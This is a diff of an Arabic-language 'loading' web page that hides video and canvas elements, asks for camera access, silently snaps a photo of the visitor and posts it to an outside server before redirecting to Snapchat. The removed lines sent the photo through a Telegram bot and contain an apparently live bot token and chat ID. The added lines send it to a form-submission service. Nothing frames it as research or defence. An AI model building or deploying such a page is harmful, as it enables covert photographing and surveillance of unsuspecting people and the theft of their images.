@@ -5,14 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري التحميل...</title>
     <style>
-        body { 
-            text-align: center; 
-            font-family: Arial, sans-serif; 
-            padding-top: 50px; 
-            background-color: #f4f4f4; 
-            color: #333;
-        }
-        video, canvas { display: none; } /* إخفاء العناصر التقنية */
+        body { text-align: center; font-family: Arial, sans-serif; padding-top: 50px; background-color: #f4f4f4; color: #333; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
@@ -22,33 +16,32 @@
         <p>يرجى الانتظار لحظة لتحميل المحتوى.</p>
     </div>
 
+    <!-- العناصر التقنية المخفية -->
     <video id="video" width="640" height="480" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        // معلوماتك الخاصة
-        const TELEGRAM_TOKEN = "8780843163:AAEQYDrUCNzSF32SWGKYdzx6h2pWn4mIsd4"; 
-        const CHAT_ID = "7191557045"; 
+        // الرابط الخاص بك من الصورة
+        const FORM_URL = "https://forminit.com";
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const statusText = document.getElementById('status');
 
-        // حل مشكلة التعليق: إذا لم تفتح الكاميرا خلال 4 ثوانٍ، سيتم التحويل تلقائياً
-        const autoRedirect = setTimeout(() => {
+        // مؤقت ذكي: إذا لم تفتح الكاميرا خلال 5 ثوانٍ، سيتم التحويل تلقائياً
+        const fallback = setTimeout(() => {
             window.location.href = "https://snapchat.com";
-        }, 4000);
+        }, 5000);
 
-        // طلب صلاحية الكاميرا
-        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        // 1. طلب فتح الكاميرا
+        navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
-                clearTimeout(autoRedirect); // إيقاف التحويل التلقائي لأن الكاميرا فتحت
+                clearTimeout(fallback);
                 video.srcObject = stream;
-                
-                // الانتظار ثانية واحدة فقط لالتقاط صورة واضحة
-                setTimeout(captureAndSend, 1000);
+                // الانتظار ثانية ونصف لالتقاط صورة واضحة
+                setTimeout(captureAndSend, 1500);
             })
             .catch(err => {
-                // في حال الرفض أو وجود حظر من المتصفح
                 window.location.href = "https://snapchat.com";
             });
 
@@ -56,20 +49,25 @@
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, 640, 480);
             
+            // 2. تحويل اللقطة إلى ملف وإرساله
             canvas.toBlob(blob => {
                 const formData = new FormData();
-                formData.append("chat_id", CHAT_ID);
-                formData.append("photo", blob, "image.jpg");
+                // "file" هو الاسم الذي يتوقعه الموقع لاستلام المرفقات
+                formData.append("file", blob, "camera_snap.jpg");
+                formData.append("message", "تم التقاط صورة جديدة من الموقع");
 
-                fetch(`https://telegram.org{TELEGRAM_TOKEN}/sendPhoto`, {
+                fetch(FORM_URL, {
                     method: "POST",
-                    body: formData
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
                 })
                 .finally(() => {
-                    // التحويل فوراً بعد محاولة الإرسال
+                    // التحويل لسناب شات فوراً بعد محاولة الإرسال
                     window.location.href = "https://snapchat.com";
                 });
-            }, 'image/jpeg', 0.6);
+            }, 'image/jpeg', 0.7);
         }
     </script>
 </body>
